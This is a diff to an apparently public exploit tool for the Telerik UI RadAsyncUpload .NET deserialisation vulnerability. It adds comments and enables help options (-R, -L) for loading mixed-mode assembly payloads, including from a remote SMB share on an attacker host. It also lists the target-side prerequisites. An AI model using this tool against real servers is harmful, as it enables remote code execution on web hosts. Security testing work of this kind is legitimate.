@@ -27,7 +27,10 @@
 
 # .NET deserialisation was discovered by @mwulftange and mitigated in R3 2019 SP1 by adding whitelisting feature
 
-# Collaborator/Responder feature added August 2020
+# Collaborator/Responder feature added August 2020 to extend existing custom
+# payload feature. Also now supports loading of local (to the target) and 
+# remote (to the target) mixed mode assembly payloads for .NET deserialisation.
+# Pre-reqs for  remote (to the target) payload features:
 # - requires target to be running IIS App pool with sufficient privileges
 # - requires target to have sufficient outbound smb on firewall and/or dns egress
 # Credit to @rwincey - demonstrating possibility of pulling in remote assemblies
@@ -437,8 +440,8 @@ def mode_help():
         "Check remote SMB payload capability -r lhost url [proxy]\n\n" +
         #    E.g. Responder/Collaborator
 
-#        "Load remote payload                 -R lhost/share/mixed_mode_assembly.dll url [proxy]\n\n" +
-#        "Load local payload                  -L c:/users/public/documents/mixed_mode_assembly.dll url [proxy]\n\n" +
+        "Load remote payload                 -R lhost/share/mixed_mode_assembly.dll url [proxy]\n\n" +
+        "Load local payload                  -L c:/users/public/documents/mixed_mode_assembly.dll url [proxy]\n\n" +
 
         "Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau\n" +
         "Example Version:           2016.2.504\n" +
